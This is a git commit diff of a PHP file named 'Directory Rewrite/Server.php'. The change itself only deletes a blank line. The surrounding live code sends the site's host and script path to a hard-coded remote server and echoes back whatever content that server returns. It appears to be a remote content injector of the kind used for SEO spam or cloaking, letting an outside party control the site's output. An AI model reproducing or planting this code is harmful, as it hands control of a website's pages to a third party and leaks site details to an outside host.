dc2b10e121fa9e549b4a9ae898264c25fc1123f4
i0nAy <i0nAy@Hotmail.com>
2018-12-04 07:13:33 +0800

    update New Version

--- Directory Rewrite/Server.php
+++ Directory Rewrite/Server.php
@@ -7,5 +7,4 @@ $Remote_server = "http://menu.38dgs.com";
 $host_name = "http://".$_SERVER['HTTP_HOST'];
 $Content_mb=file_get_contents($Remote_server."/index.php?host=".$host_name."&url=".$_SERVER['PHP_SELF']);
 echo $Content_mb;
-
 ?>
